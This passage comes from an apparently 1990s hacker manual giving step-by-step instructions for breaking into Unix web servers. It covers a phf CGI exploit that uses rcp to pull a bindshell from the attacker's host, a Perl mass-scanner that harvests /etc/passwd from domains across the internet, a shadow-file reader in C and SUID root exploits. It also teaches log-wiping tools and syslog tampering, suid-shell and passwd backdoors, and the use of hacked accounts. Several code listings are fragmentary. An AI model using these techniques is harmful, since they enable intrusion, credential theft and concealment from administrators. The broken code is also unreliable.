
So, to get this onto the remote host, all we have to do is put it in
test's homedir (make sure it's readable) and do:

 	phf 'rcp test@my.ip.address:bindwarez /tmp' www.host.to.hack

in your local logs you will see a connection attempt to in.rshd and the
command it executes (something like 'rcp -f bindwarez').. after the phf
finishes bindwarez will be in the /tmp on the remote machine.  You can now
execute it and telnet to port 9999.  

If the web site was stupid enough to be running httpd as root you will now
want to secure it by installing an in.telnetd trojan and cleaning up the
logs.  However, more likely, you will only have a nobody shell and have to
hack root with some other sploit.  I usually find this no problem because
the admin has taken it as granted that no-one will ever have a shell on
their www box and thus there's no need to secure it - which they're
obviously not very good at if they still have sploitable phf.  

I cant stress the importance of cleaning out the logs tho.  Your address,
the one in the rcp command you sent, is right there for the admin to see.
They dont even have to dig.  These logs are usually in
/usr/local/etc/httpd/logs and sometimes in /var/lib/httpd/logs.  The best
way to find it is to try these locations and then, if you still don't find
it, do: find / -name cgi-bin.  That'll do it.  Also don't forget to kill
the bindwarez processes and remove the /tmp/bindwarez.  

This is a really kewl attack.. it solves a lot of problems which makes phf
so annoying.

Another way to use phf would be to use the perl script a few scripts above
called getdomain.pl to rip host names out of the domain files on
rs.internic.net, after this is done you can 'probe' every domain on the net
using geturl.pl.

Here is the script:

geturl.pl

my(@URLs)=();
my($program) = "lynx -dump";

# Pull off filename from commandline. If it isn't defined, then assign default.
my($URLfilename) = shift;
$URLfilename = "urls" if !defined($URLfilename);

# Do checking on input.

# Open and read contents of URL file into @URL by line.
open(FILE, $URLfilename) or die("GetURL: Cannot open $URLfilename for input.\n");
@URLs = <FILE>;
close(FILE);

  foreach (split(/\n/, $result)) {
    print OUTFILE ("$_\n");
  }
  if ($result =~ m/id=/i) {
    if ($result =~ m/root/i) {
      print ("Logging root response.\n");
    } else {
      print ("Got ID response, getting /etc/passwd...");
      $result = `$program http://${url}/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd`;

        close(PASSWDFILE);
        print ("Done! [$domainfilename].\n");
      } else {
        print ("FAILED! [$domainfilename].\n");

Ok this is easy, if you name your domain file urls, you are all set to go.
Just type geturl.pl after chmod +x on the file.

Here are my doc's for the file:

This handy tool is easy to use and will get you some root access and
many passwd files from different domains.

geturl.pl will try and log results for every domain on the internet.  You
choose the type: .COM .EDU .ORG .MIL .GOV  (OR) you can supply a list of
IP addresses to  be checked.  If  finds a root access account it
will simply log uid=root in the result file and go on to the next domain.
If PHF Probe finds non-root access it will snag the passwd file for you and
save it in the current directory in the (domainname.???.passwd) format.

Here are the short doc's and how it works.  Any questions /msg i-e or i^e

ftp to ftp.rs.internic.net

in the domain directory you will find:

com.zone.gz
edu.zone.gz
gov.zone.gz
mil.zone.gz
net.zone.gz
org.zone.gz

download these files and run getdomain.pl on the domains you want to target
first, in this manor:  "perl getdomain.pl com.zone com >com.all"

What this will do is rip all of the .COM domains and put them into a file
called com.all.

If you wanted to do all of the .EDU addresses you would type:

perl getdomain.pl edu.zone edu >edu.all

Now you will have a list to use with (geturl.pl) called edu.all

To use this list just type:

geturl.pl <filename>

filename=edu.all or com.all  and leave out the <>'s
if you name your domain file 'urls' it does not require <filename>

results will log into a file name of: GetURLResults in the current directory.

1. geturl.pl will search using lynx (make sure it is in your path)

2. if geturl finds it has root access to httpd on a url it will just log
   root for that domain in the result file.  If geturl finds it is not root,
   but still has access to the domain using phf it will snatch the domain
   passwd file and save it in the current directory under fulldomainname.passwd

3. if you like you can just give a list of ip addresses in the feed file

4. i use os/2 with lynx and perl ported to the hpfs so i have no problems
   with the long file names.  i have tested it under unix and it works good
   so you should have no problems running this in a unix shell.

What you need:

1. Perl in the path
2. Lynx in the path
3. 256 char filenames ie: (unix or os/2 hpfs)
4. The files included here
5. Internic's domain files from their ftp or just make your own list or
   urls or IP's and name the file 'urls' and type: geturl.pl

Caution:

It would be best if you paid cash for an internet account in your area under
another name or used a hacked account to get all of your results, then used
another safe account to start your work on the results.  BUT I don't need to
tell you this right?  I take no blame for these files, they are provided for
you to use to check security on domains ;)


 getdomain.pl: to rip .ORG .COM .EDU .MIL .GOV Internic domain files
    geturl.pl: to check and log the results of each domain
GetURLResults: The file that geturl makes as its log file

Here is one more thought:

If you can read the /var/adm/messages file you can get some user passwords
out of there lotz of times!  I have even got ROOT passwords from there!

Wow many times have you been in a hurry to login?  You type the password
at the Login:  his is easy to do on one of those days that nothing seems to
be going right.  You failed the login twice, the system is running slow, and it
just happens!

Login: you hit enter
Password: you think this is wanting the login name so you type your name
Login: you type your password

In the messages file it looks like this:

Login: yourpassword
Password ****** They don't give it, only the login name, but ooops, you
typed your password, and if we have access to read the messages file,
we have a good password to put in crackerjack and run it.  If on a small
system, no prob ... lets hope it's root ;)

Here is a script to make things easy!

Yup, again, just another place to get password files.  Just follow the guide

Remember you could have been a lammer before you read this manual <G>rin

Section 3C
Getting shadow passwd files
-----------------------------

What is a shadow password file?

Lets just use the passwd file above to show you what it would look like to you
if you cat it.

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:
daemon:x:2:2:daemon:/sbin:
adm:x:3:4:adm:/var/adm:

bhilton:x:501:100:Bob Hilton:/home/bhilton:/bin/bash
web:x:502:100:Web Master:/home/web:/bin/bash
mary:x:503:100:Mary C. Hilton:/home/mary:/bin/bash

Something missing?  Yup, the encrypted passwords.  If you get root access the
encrypted passwords are in /etc/shadow.  Some admin's will hide the shadow file
in some weird directory somewhere, but most of the time you will find it right
in /etc.  Other shadow programs might put it in a master.passwd file.  But if
you get root just have a good look around.

Lets say you have an account on the machine and just can't get root access.

Not a problem if they are using libc 5.4.7, at this time most still are ;)
Also one of these files have to have suid perm's (no prob):

ping, traceroute, rlogin, or, ssh

1. Type bash or sh to start a bash shell
2. Type: export RESOLV_HOST_CONF=/etc/shadow
3. Type one of the file names above with asdf, like this:

ping asdf

It should cat the passwd shadow file for you if it works.
I seem to find it working on most of the systems i am going on these days.

Note: you can replace /etc/shadow with any root owned file you want to read.

Here is a quick script you can run on any file you want to make it easy:

rcb.c
-------- cut here

/* RCB Phraser - therapy in '96
 * Limits: Linux only, no binary files.
 * little personal message to the world: FUCK CENSORSHIP!
 */

void getjunk(const char *filetocat)
{ setenv("RESOLV_HOST_CONF",filetocat,1);
  system("ping xy 1> /dev/null 2> phrasing");
  unsetenv("RESOLV_HOST_CONF");
}

void main(argc,argv)
int argc; char **argv;
{ char buffer[200];
  char *gag;
  FILE *devel;
  
  if((argc==1) || !(strcmp(argv[1],"-h")) || !(strcmp(argv[1],"--help")))
  { printf("RCB Phraser - junked by THERAPY\n\n");
    printf("Usage: %s [NO OPTIONS] [FILE to cat]\n\n",argv[0]);
    exit(1);
  }
  getjunk(argv[1]);
  gag=buffer;
  gag+=10;
  devel=fopen("phrasing","rb");
  while(!feof(devel))
  { fgets(buffer,sizeof(buffer),devel);
    if(strlen(buffer)>24)
    { strcpy(buffer+strlen(buffer)-24,"\n");
      fputs(gag,stdout);
    }
  }
  fclose(devel);
  remove("phrasing");
}

command line : rcb /etc/shadow  or any other file on the system you
can't read ;)

--------------------
Section 3D
Getting /etc/hosts
--------------------

Just a precaution, sometimes you will need to know what other systems
are in the hosts file, or what are all of the ip addresses or different domains
on the system.  Make sure to cat the /etc/hosts file for more information
you might need later.

--------------------------
Chapter IV
Getting the root account
--------------------------
Like I said before all you need is one account in most cases, if you cannot get
root on the system you might want to trade it off to some irc junkie that
just wants to load a bot, for some other account or info that can help you in
your hacking quest.  There will be enough information here so that if you can't
get root access, their system is well kept and probably will be kept up in the
future.  You can always lay the account on the side, put the info in some kind
of log file with some good notes so that you can come back at a later time,
like right when a new exploit comes out ;)

Try to stay out of the system until that time so that you do not risk loosing
the account.  Remember that when you login to an account and can't get root
you will not be able to clean the logs, and the next time the user logs in he
might see a message that says: last login from xxx.com time:0:00 date:xx/xx/xx

Section 4A
Bugs
------------

There are many bugs out there in different programs that you can use to get
root.  It might be a game installed on the system, or even the sendmail
program.  If they do not update their programs on a regular basis, you can
be sure you will be able to get in now, and if not, soon to come.

I will be sure to provide the main exploits and bugs here and other less
used below in the appendix section.  I will make sure here to give you detailed
english terms so that you can exploit root on the system.  But please be sure
to read the sections below, and this manual entirely before proceeding, to be
sure you get started in the right way and not blow you chances of having a
long stay on the system.

Section 4B
Exploits
------------

umount/mount exploit

Look in the /bin directory for a file called umount (or mount),
if you do not find it there do a search for the file like this:

find / -name umount -print -xdev

(you can look for any other file name the same way)

Go to the directory where the file is and do: ls -al um*

If the file has suid perm's you can probably get root.

SUID perm's has the rws for the owner of the file which is root.  What you are
looking for is the (s)

Look here:

victim:/bin# ls -al um*
-rwsr-sr-x   1 root         8888 Mar 21  1995 umount
victim:/bin#

This machine we can get root by a compile on the file below:

umount.c
------ cut here

/* sno.c : Linux realpath exploit
 * Syntax: ./sno N
 *         mount $WOOT 
 *    OR  umount $WOOT
 * N is some number which seems to differ between 4 & 8, if your number is
 * too big, you will get a mount error, if it is too small, it will seg
 * fault.  Figure it out.  (Sometimes N=0 for mount)
 * If you use mount, first thing to do once you get the root shell is rm 
 * /etc/mtab~, if this file exists you can't root with mount until it is 
 * removed.
 *

**********************************
To compile the file on the victims machine type gcc umount.c (or what ever
name you called it) -o um

This will make a file called um that you can exec.  Sometimes you will need
to put a ./ in front of the file like this: ./um

With this exploit you might also have to give it a number like:
./um 0 (or) ./um 4 ....alltheway up to 8... like this again ./um 8


*************************************
If you fail here you might want to try lpr.  Look in the /usr/bin for lpr and
see if it is SUID, if it is lpr should work if it is up on the system.

ls -l lpr

Ok it had suid perm's?  Use this script

Now just compile it and chmod it +x, and run it.

Watch this one on the group file owner.  Any file you copy will have
group owner as lp, make sure you chgrp root filename on any file you
write.  Always be watching the user groups with ls -l and if you changed
any change them back like this:

chgrp groupname filename

It is a good idea to use this exploit ONLY to get the root access, then
just copy bash or sh to another file name on the system somewhere and make
it root root, suid:  Group owner and File owner root, then chmod it +s

This will give you root access in the future as gid and uid root, without using
the lp group.  Make sure you name it something that looks like it should be
running as a root process somewhere ;)

Here is another that is still around after a while, look for SUID perm's

Ok this is how splitvt works:

1. Compile the file
2. Run the sp file
3. Run splitvt

Before you run the file:   whoami {press enter}
                           username
After you run the exploit: whoami
                           root

Just chmod the file +x like this

chmod +x sm.sh

1. Run the file
2. It will take you to the /tmp directory
3. type ls -l and see if you have a SUID sh file there, if you do, type
   whoami, if not root, run the file ./sh, now see if you are root ;)

I will add many more scripts in the appendix, but these should be the best
at this time to get root access on linux or BSD, if you need another BSD
exploit try the crontab exploit for BSD in the appendix.

Chapter V
Making yourself invisible
--------------------------

The whole point of this hacking stuff is that you continue to have access to as
many points of information as possible.  If you do stupid things, of fail just
once to clean your utmp or wtmp, xferlog's, etc ... you can loose access to the
system.  Make yourself a regular order to follow and learn each system well!

Become part of the system, and take many notes if you are doing many systems
at once.  But remember make yourself a routine.  Have your set routine of
taking your time to clean any presence of your login, transfers, etc.  Do NOT fail
in this one thing or you will loose access and possibly face some sort of
charges.

----------------------------
Section 5A
Zap2 (for wtmp/lastlog/utmp)
----------------------------

There are different log cleaning programs out there, but the best of these
is zap2.  I compile mine to be named z2.

z2 will be run right after you get root access.  This will want to be one of
the fastest things you run.  (you never know)

You might want to do a finger @host.xxx to see who is on now, look at the idle
time of root or admin accounts to see if they are away doing something.

Login, and as soon as you get on, type w, to see idle time and who is on, but
at the same time you are looking at that be typing your root access command
that you should have waiting somewhere nested in the system.  As soon as you
get your root access, type ./z2 username-u-logged-in-as

Now you are safer then you were.  Do a w or who command to see that you are
gone from the utmp.  If you ftp, or do other things you might have to use
other programs I will include in the next section called wted and lled.

Lets finish with this z2 first.  You will have to see where each file is in
the system and edit z2.c to include the right location of these files

Here is the area you will look for right at the top of the file:

#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"

Most of the systems I login to are:

#define WTMP_NAME "/var/adm/wtmp"
#define UTMP_NAME "/var/adm/utmp"
#define LASTLOG_NAME "/var/adm/lastlog"


But you do your own look around to see were the files are.  Also /var/log:
is a regular location.

Add the log locations for each system, compile the file, and you are all ready
to be invisible right after the login using z2

Here is the .c file

Section 5B
Other scripts
---------------

Now we come to the other part of this.  Lets say that after you login, and do
your z2, you need to ftp in to grab a file. (remember NEVER ftp or telnet out)
Ok, you ftp in and grab a few files, or login to another account on the system,
now you will need to use wted.  wted will let you edit the wtmp to remove your
login from the ftp.  You also might need to use the lled (lastlog edit).

Here is the menu if you type ./wted, after setting log locations & compile:

[8:25pm][/home/compile]wted
Usage: wted -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
            -h      This help
            -f      Use FILE instead of default
            -a      Show all entries found
            -u      Show all entries for USER
            -b      Show NULL entries
            -e      Erase USER completely
            -c      Erase all connections containing HOST
            -z      Show ZAP'd entries
            -x      Attempt to remove ZAP'd entries completely

So if i ftp to username tsmith I would type wted -x -e tsmith

The program will now prompt you one login at a time for the user tsmith asking
if you want to delete it.  After you delete your login, make sure to
chmod 644 the wtmp.tmp file and then copy it over the top of the wtmp file in
the log directory.  Like this:

1. chmod 644 wtmp.tmp
2. cp wtmp.tmp /var/adm/wtmp

Here is your wted program:

MAKE SURE TO HAVE THE RIGHT PATH TO THE char file below

You might also have to clean stuff out of the file /vat/adm/lastlog

For this use the lled.c.  Compile the program and name it lled.

Here is a menu from the program when you type ./lled

[4:04am][/home/paris/compile]lled
Usage: lled -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
-h      This help
-f      Use FILE instead of default
-a      Show all entries found
-u      Show all entries for USER
-b      Show NULL entries
-e      Erase USER completely
-c      Erase all connections containing HOST
-z      Show ZAP'd entries
-x      Attempt to remove ZAP'd entries completely

It would be good to try to view first using -u, but many times it will not
show your username in the lastlog, but it will still have your host, so I
have found that if you know what to look for you can just type something like:
If my host name that I was coming from was machine.edit.com, I could type

lled -e username -c machine.edit

If you need to view the lastlog your host entry should be at the end of the
file, just type: lled -a

chmod the file lastlog.tmp 644 and copy the file over the top of the lastlog
file in the log directory just like you did above for the wted.

BE SURE TO SET THE PATH FOR YOUR lastlog below!

A good perl script for editing utmp, wtmp, and checking processes.
It will also let you insert lines in wtmp.  So if you need to play you
can add clinton.whitehouse.gov logging into port ttyp3 and show he stayed
on the system for a few hours!

Running 'check' will let you know if someone is on the system and not showing
up in the utmp log.  Admins like to hide the fact that they are online
sometimes.  This will allow you to see their connection.  You must be root to
run the script, and they need perl 5.003+ on thier system.  After starting
the script just type help.

Here are some of the basic commands:

starts by loading wtmp

delete user username
delete host hostanme
write

read wtmp
delete user username
delete host hostname
write

do help for the rest ... the best wtmp,wtmp editor around!

utmpManager Help
----------------

Note: - <n> is an argument.
      - [id=] is a token which expects a value as part of command
        (ie, insert id=p5 user=root 11/23/96). See the insert command.
      - A line is the full name to the tty port, ie ttyp0.
      - An id is the *unique* representation of the port
        (without the tty, etc), ie "p0" (for ttyp0).

  check
    - Perform user consistancy check. Use this to make sure that the data in
      utmp agrees with who is actually on the machine. This is useful in
      determining if a user is online with hidden ports, running nohup'd
      processes, or running iScreen.

  delete <x>-<y>
    - Delete entries #x to #y.

  delete host <host>
    - Delete *all* entries which match the substring <host>.

  delete line|id <line|id>
    - Delete entry containing <line> or <id>.

  insert {id=|line=} [type=] [user=] [host=] [ConnTime] {LogoffTime}
    - Insert an entry into utmp/wtmp files specifying any combination
      of id/line, type, username, host, connection time, and logoff time.
      (LogoffTime only valid for WTMP files.)

  list host <host>
    - List all entries matching the substring <host>.

  list line|id <line|id>
    - List all entries matching <line> or <id>.

  read utmp|wtmp|<filename>
    - Read entries from either default wtmp, default utmp, or an arbitrary
      filename. Note: arbitrary filenames MUST start with either "utmp" or
      "wtmp" to be used with this editor. Rename files *outside* of this
      editor if necessary. If read is executed without any arguments, it
      rereads the last given filename, which is displayed on the prompt.

  write {filename}
    - Write entries to file {filename}. If write is executed without any
      arguments, then entries will be written to the last given filename,
      which is displayed on the prompt.

Cleaning the log files

Section 6A
A walk around a hacked system
-------------------------------

I can't stress the importance of this enough! Clean, Clean!!!!  In this section
I will take you on the system first hand and show you some basics on what to
look for, and on how to wipe your presence from the system.  To start this lets
logon a system:

Here is the step by step through the basic process:

******----> see who is on the machine

[/home/master]finger @victim.net
[victim.net]
No one logged on.

******----> good no one on, we will log on

[/home/master]telnet victim.net

Trying xxx.206.xx.140...
Connected to victim.net.
Escape character is '^]'.

Welcome to Victim Research Linux (http://www.victim.net) Red Hat 2.1
Kernel 1.2.13 on a i586


ns.victim.net login: jnsmith
Password:
Linux 1.2.13.
You have new mail.

******----> Don't read his mail, you can cat all mail in /var/spool/mail
            and in each users /home/username/mail directory

******----> Check again to see if anyone is on

[jnsmith@ns jnsmith]$ w

5:36am  up 18 days,  8:23,  1 user,  load average: 0.01, 0.00, 0.00
User     tty       login@  idle   JCPU   PCPU  what
jnsmith   ttyp1     5:35am                      w

******----> Just me, lets get root and get lost in the utmp!

[jnsmith@ns jnsmith]$ cd .term

******----> Nice directory to hide stuff ;)

[jnsmith@ns .term]$ ./.u

******----> I had this already waiting, it was the umounc.c exploit

Discovered and Coded by Bloodmask and Vio, Covin 1996

******----> We are now root, lets use z2 to become invisible

bash# z2 jnsmith
Zap2!

******----> Let's see if we are still on ...

bash# w
5:37am  up 18 days,  8:24,  0 users,  load average: 0.08, 0.02, 0.01

******----> Hmm. now there is no one on the system, i must have logged off ;)


******----> We know we are root, but lets check you you can see ...

bash# whoami
root
bash#

******----> Yup, root ..  What directory are we in?

bash# pwd
/home/jnsmith/.term

******----> Let's check the logs

bash# cd /var/log

******----> most of the time in /var/adm, this box uses /var/log

bash# grep dormroom *
maillog:Jan 29 05:31:58 ns in.telnetd[22072]: connect from dormroom.playhouse.com
maillog:Jan 29 05:35:29 ns in.telnetd[22099]: connect from dormroom.playhouse.com

******----> Yup, the z2 took care of everything but this maillog ...

bash# pico maillog

******----> in pico i did a ctrl w, and searched for dormroom then ctrl k to
            delete lines


******----> These were the lines deleted

Jan 29 05:31:58 ns in.telnetd[22072]: connect from dormroom.playhouse.com
Jan 29 05:35:29 ns in.telnetd[22099]: connect from dormroom.playhouse.com

bash# grep dormroom *

******----> Yup .. all clear ;)

bash# w
5:41am  up 18 days,  8:27,  0 users,  load average: 0.00, 0.00, 0.00
User     tty       login@  idle   JCPU   PCPU  what

******----> Yup .. all clear here too ;)

******----> Lets show you how you would use lled and wted if the grep would
            have shown something in those files

bash# cd ~jnsmith/.term
bash# lled
bash# lled -c dormroom.playhouse
Entries stored: 527 Entries removed: 0
Now chmod lastlog.tmp and copy over the original /var/log/lastlog

******----> Nothing in the lastlog

bash#
bash# wted -e jnsmith
Entries stored: 254 Entries removed: 0
Now chmod wtmp.tmp and copy over the original /var/log/wtmp

******----> Nothing in the wtmp, both of these would have shown in the grep
            we just did in the /var/log (just showing you the commands)

******----> Lets do some sniffing ...

bash# pico linsniffer.c

******----> I changed this line to tell where i want the log to go:

#define TCPLOG "/tmp/.pinetemp.000"

******----> lets look at what is running to think of a name that
            looks almost like it belongs there

******----> Make sure you place this sys link .bash_history to /dev/null so
            you do not leave a history behind...

This is the command to do it, but make sure you delete the old .bash_history
if it is there.

ln -s /dev/null .bash_history

Ok logout ...

Ok, there is another way!!!!!!

If you can remember and make it a practice that you NEVER forget, get used to
this.... EVERY TIME you login to an account type: unset HISTFILE

This will tell the system to delete your history file when you logoff the
system...   USE THIS!  Get into the practice!  DON'T FORGET!

-----------
Section 6B
messages and syslog
-----------

In the log directory you will find a file called 'messages' each system is
different as far as what is logged to what files or what file name.  Make
sure to check in the /etc/syslog.conf file for additional logging to
remote machines.  If this is being done you will see something like this:

*.*                                 @somehostname.xxx

Or just to check and see where the log files are going you can view this file
/etc/syslog.conf.

Here is a sample...

bash# more syslog.conf
# /etc/syslog.conf
# For info about the format of this file, see "man syslog.conf" (the BSD man
# page), and /usr/doc/sysklogd/README.linux.
#
# NOTE: YOU HAVE TO USE TABS HERE - NOT SPACES.
# I don't know why.
#

mail,news.=info                                 @quality.com

Here some of the logs are going into a hidden directory in the /root directory
and a copy of every alert and warning are being also sent to the logs at
quality.com.  wtmp, utmp and lastlog are still local, so you can still be
ok, just make sure not to use 'su' on a system like this.  Also notice above
that alert messages are being mailed to root and bob on this system.

Also take note that syslog, mail, and, info are being sent to the /var/adm
directory to fool you into thinking all of the logs are in /var/adm!  If you
edit /var/adm the admin can run a diff on the backup files in the /root dir.

Ok, so you go to the /var/adm or /var/log directory and:

grep yourhost * |more
grep your ip * |more

you see that some files are logging your connection, mark down what files
are logging you and edit the /etc/syslog.conf file.  You will from trial
and error in most cases make it skip the logging process of your domain.

BUT, make sure to do a few things.  After you edit the file restart the
syslogd.  You can do this by doing a ps -x

$root> ps -x

39  ?  S    1:29 /usr/sbin/syslogd

find the syslogd and notice the process id here is 39, so you do:

kill -HUP 39

This will restart the process and put your changes into effect.

The other thing is to make sure to do a ls -l /etc/syslog.conf BEFORE you
edit it and touch the file date back to the original date and time after
you edit it.  This way if they notice the logging looks different, they
will check the file date and think it must be something else.  Most admins
would not know how to setup this file in the first place, so you in some
(or most) cases ok to edit it.

Here is another file to look at.

/etc/login.defs

# Enable "syslog" logging of su activity - in addition to sulog file logging
# SYSLOG_SG_ENAB does the same for newgrp and sg.
#
SYSLOG_SU_ENAB          yes
SYSLOG_SG_ENAB          yes
#
# If defined, all su activity is logged to this file
#
SULOG_FILE      /home/users/bob/.list

Notice here that there is an su log file in a hidden file in one of
the admin's directories.

Section 6C
xferlog
-----------

The xferlog can be edited with your favorite text editor, pico, joe, vi, etc..
you can then search for your transfers and delete the lines and save the file.
You will need to do this after transferring any files.

You will also want to grep the files in the /usr/local/etc/httpd/log directory
if you have used the web or phf on the system to remove your presence
from there.

grep (username or hostname) * |more

If you need to find the logs for httpd you can do a find -name httpd.conf
-print and view the config file you see where the httpd logs are going.

There might be different ftp logs for transfers in some ftp or virtual ftp
directory some where.  View the files in the /etc/ftp* to find what the ftp
setup is on the box.

Here I have shown you to edit log files using pico, joe, or other editors.

There is another way... Sometimes log files might be real large and the editor just might
not cut it ;)  Here is what to do...

You have a messages file 20 meg ... wow!

If you want to get the lines that have fudge.candy.com out of this file you
might want to do this:

grep -v fudge.candy >messages.2
rm messages
mv messages2 messages

then kill -HUP <process id for syslogd>

-v means grep everything that does not match the line, so you are greping
the file -what you do not want to a new file name messages.2.  Check the
file size after the grep to make sure no errors were made and replace the
old one with the new one and restart syslogd.

This can also be used with other logs like xferlog, syslog, etc...

Here is a perl script that will do it for you from command line.

------------------- start of riptext.pl
#!/usr/bin/perl
#
# RipText - Takes regular expression and filename argument from @ARGV. Any 
#           lines MATCHING regular expression will *not* be printed to 
#           STDOUT. 
# 
#

die("\nUsage: riptext [regexp] {filename}\n\n") if (!defined($ARGV[0]));
($regexp, $filename) = @ARGV[0,1];

# Read in contents of file.
$/ = undef;
$contents="";
if (!defined($filename)) {
  # Use STDIN.
  $contents = scalar <STDIN>;
} else {
  # Use FILE.
  open(FILE, "<$filename") || die("-RipText- Cannot open $filename: $!\n");
  $contents = scalar <FILE>;
  close(FILE);
}

@contents = split(/\n/, $contents);

# Strip file of matching lines.
open(FILE, ">$filename") || die("-RipText- Cannot write $filename: $!\n");
foreach (@contents) {
  print FILE "$_\n" unless (/$regexp/i);
}
close(FILE);

0;

------------------------ end of riptext.pl

Remember to restart syslogd after you edit files, true you will not see
the stuff, and it will be gone to your eyes, but if you do not restart the
process, the data is still in memory and can be retrieved until you restart
the process!

Also look for notes in the syslog that the syslogd process was restarted at
such and such a time.

Section 6D
The cron table
---------------

Make sure to look at admin's and root cron files, here in this system we find
a root cron file in: /var/spool/cron/crontabs
bash# ls -l
total 1
-rw-------   1 root     root          851 Jan 26 14:14 root

bash$ more root
# This updates the database for 'locate' every day:
40 07 * * *       updatedb 1> /dev/null 2> /dev/null
40 */12 * * *       /sbin/checkfs

there is a file running here in /sbin called checkfs.

bash$ cd /sbin
bash$ /sbin # more checkfs
#!/bin/bash

if [ ! -f /etc/default/fs/.check ]; then
  echo WARNING!! Filecheck default file cannot be found. Please regenerate.
    exit
    fi

md5sum /usr/bin/* > /tmp/filecheck 2>/dev/null
md5sum /usr/sbin/* >> /tmp/filecheck 2>/dev/null
md5sum /sbin/* >> /tmp/filecheck 2>/dev/null
md5sum /bin/* >> /tmp/filecheck 2>/dev/null
md5sum /usr/local/bin/* >> /tmp/filecheck 2>/dev/null
md5sum /usr/local/sbin/* >> /tmp/filecheck 2>/dev/null
md5sum /lib/* >> /tmp/filecheck 2>/dev/null
md5sum /usr/lib/* >> /tmp/filecheck 2>/dev/null
diff /tmp/filecheck /etc/default/fs/.check > /tmp/filecheck2 2>&1

if [ -s /tmp/filecheck2 ]; then
  mail -s FSCheck bin < /tmp/filecheck2
  fi

rm /tmp/filecheck /tmp/filecheck2 2>/dev/null

md5 is a checksum file, if you change or add a binary file to any of the
above directories the information of the changes will be mailed to the
admin.

Chapter 7
Keeping access to the machine
------------------------------

There are many ways to keep access to the machine, you will loose
access to many as you as you are learning, but I hope with this manual
and some experience you will become a stable hacker.

Section 7A
Tricks of the trade

Here are some 'tricks' of the trade that will help you keep access
to the machine.  After a system admin has found you out, they will be watching
for you and going through everything on the system.  They will go as far as
recompiling binary files, changing everyone's passwords, denying your host you
came in from to the machine, going through the passwd or shadow file, looking
for SUID files, etc....

When you see that you have been found out, do not try to get access to the
system again.  I have seen others right after being cought, try everyone of
their trojans, other accounts, and other backdoor's they placed for continued
access.  Well think about it, they are watching for you ... you are showing
them every in that you have to the system, and every exploitable file you
are making known to them.

NO!  WAIT!  Give it a few months, they will think everything is ok, and they
will relax and you can come in with one of the backdoor's they missed, and you
can do your thing on the logs for all of the attempts you made on the system
to get back in.

Ok here are some tricks of the trade.

History Files:
--------------
Always put your .bash_history to /dev/null, if you don't make sure you at least
edit it.  Remember the .bash_history will always have your last commands until
the logoff.  So if you edit it, it will show that you are editing it. You might
try changing your shell and editing it there, but this all seems like a pain,
just set it to /dev/null

1. Delete the file in the user directory .bash_history if it there.
2. Type this command in the home directory: ln -s /dev/null .bash_history

Nested directory:
-----------------
Always find a directory on the system to hide your files.  There are a few good
ones that most users never look into.

In the users home directory look for .term, all you will find in this directory
is an executable file called termrc.  Admin's and users alike are used to seeing this
hidden directory, and never EVER go into it.  if they did what do you think
they would say to an executable file being in there called termrc?  You are right!
Nothing .... it belongs there and it is what they expect to see there.

So lets say we make termrc a little bigger, and add suid perm's ... are you
getting the idea???? I hope you guessed it... go to the /bin directory and
type cp bash (or sh whatever is there) ~username/.term/termrc
then type : chown root ~username/.term/termrc
          : chgrp root ~username/.term/termrc
          : chmod +s ~username/.term/termrc

Now you have a nested file that can get you root on the system any time that
will not be easy for the admin to find.  If you want to get fancy, touch
the file date to make it look like an older file.

Another directory off the user accounts expected to be there and unused would
be .elm, .term or Mail, or try making a directory called '...' this is harder
to notice seeing the first directories that show are . and .., so it can go
un-noticed easy.  This is how it would look if they did a long ls:

1024 Jan 29 21:03 .
1024 Dec 28 00:12 ..
1024 Jan 29 21:03 ...
 509 Mar 02  1996 .bash_history
  22 Feb 20  1996 .forward
 164 May 18  1996 .kermrc
  34 Jun 06  1993 .less
 114 Nov 23  1993 .lessrc
1024 May 18  1996 .term
1024 May 19  1996 public_html

see how it seems to just fit into place?

but if it was just a ls -l, this is what would be seen:

1024 May 19  1996 public_html

Remember you can always look for some REAL LONG file path that you are sure
that no one would ever even want to enter into, and use this for your nested
directory.  You can even make your own directory there like:(...) ;)


Making new commands
--------------------
After you check the cron to see if there is md5 being used there, you might
want to either copy one of your exploits to another filename in the system,
or maybe just overwrite a command that you know would never be used.  If
you copy to a new file name make sure you touch the file date.  This is not
so long lasting because sooner or later they will patch the exploit and your
new file you made will not work anymore.

It is better to use a shell for the new filename, and then make it suid.

Adding or changing passwd entry's
---------------------------------
Another backdoor that you can use is to add a new user to the passwd file.
This needs to be done with caution making it look like it belongs there.
Never use your passwd addition, never login, it is just for a backup in case
you loose access.

There are different thoughts here: you do not have to make it a root account
that could cause notice to it right away.  You know you can have root any time
you want it.  Lets practice ...

We want to make our account look like it belongs, so lets keep to the top of
the file.

root:fVi3YqWnkd4rY:0:0:root:/root:/bin/bash
sysop:mZjb4XjnJT1Ys:582:200:System Operator:/home/sysop:/bin/bash
bin:*:1:1:bin:/bin:
daemon:*:2:2:daemon:/sbin:
adm:*:3:4:adm:/var/adm:
lp:*:4:7:lp:/var/spool/lpd:
sync:*:5:0:sync:/sbin:/bin/sync
shutdown:*:6:0:shutdown:/sbin:/sbin/shutdown
halt:*:7:0:halt:/sbin:/sbin/halt
mail:*:8:12:mail:/var/spool/mail:
news:*:9:13:news:/usr/lib/news:
uucp:*:10:14:uucp:/var/spool/uucppublic:
operator:*:11:0:operator:/root:/bin/bash
games:*:12:100:games:/usr/games:
man:*:13:15:man:/usr/man:
postmaster:*:14:12:postmaster:/var/spool/mail:/bin/bash
nobody:*:65535:100:nobody:/dev/null:
ftp:*:404:1::/home/ftp:/bin/bash

Looking at the above passwd file leaves us a few options so i will just list
them here.

1. Look at the user line for operator, ftp, and postmaster.  All of these
accounts have shells with no passwd's set yet.  From your shell just type:

passwd postmaster

Set the account with no passwd by just pressing enter.  Now you will be able
to log into this account any time without a password and the file will still
look right to the admin.

2. add this line to the passwd file:

syst::13:12:system:/var/spool:/bin/bash

Place it in the file where it seems to flow.  You can leave the :: for the
passwd or set the passwd to what you want by typing: passwd syst from the
root shell.  Set the group and id above to what you like.


3. Look at the line above for sync

sync:*:5:0:sync:/sbin:/bin/sync

Change this to :

sync:*:5:0:sync:/sbin:/bin/bash and then run <passwd sync> and leave the passwd
